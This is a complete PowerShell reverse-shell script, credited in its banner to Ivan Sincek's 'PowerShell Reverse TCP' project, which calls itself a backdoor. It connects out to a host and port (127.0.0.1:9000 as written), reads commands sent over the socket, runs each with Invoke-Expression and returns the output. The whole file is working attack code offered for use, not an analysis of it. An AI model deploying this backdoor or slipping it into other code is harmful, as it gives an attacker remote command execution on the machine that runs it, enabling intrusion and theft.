$socket = $null;
try {
	$socket = New-Object Net.Sockets.TcpClient("127.0.0.1", 9000);
} catch {
	Write-Host $_.Exception.InnerException.Message;
	exit(0);
}
Write-Host "########################################################################";
Write-Host "#                                                                      #";
Write-Host "#                        PowerShell Reverse TCP                        #";
Write-Host "#                                          by Ivan Sincek              #";
Write-Host "#                                                                      #";
Write-Host "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #";
Write-Host "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #";
Write-Host "#                                                                      #";
Write-Host "########################################################################";
Write-Host "Backdoor is up and running...";
$stream = $socket.GetStream();
$writer = New-Object IO.StreamWriter($stream);
$writer.AutoFlush = $true;
$buffer = New-Object Byte[] 1024;
$encoding = New-Object Text.AsciiEncoding;
$data = "";
$result = "";
try {
	do {
		$writer.Write("PS>");
		do {
			$read = $stream.Read($buffer, 0, 1024);
			if ($read -gt 0) {
				$data = $data + $encoding.GetString($buffer, 0, $read).Replace("`r`n", "").Replace("`n", "");
			} else {
				$data = "exit";
			}
		} while ($stream.DataAvailable);
		if ($data -ne "" -and $data -ne "exit") {
			try {
				$result = (Invoke-Expression $data | Out-String);
			} catch {
				$result = $_.Exception.InnerException.Message;
			}
			$writer.WriteLine($result);
			$data = "";
			$result = "";
			$buffer.Clear();
		}
	} while ($data -ne "exit");
} catch {
	Write-Host "";
	Write-Host $_.Exception.InnerException.Message;
}
$data = "";
$result = "";
$buffer.Clear();
$writer.Close();
$writer.Dispose();
$stream.Close();
$socket.Close();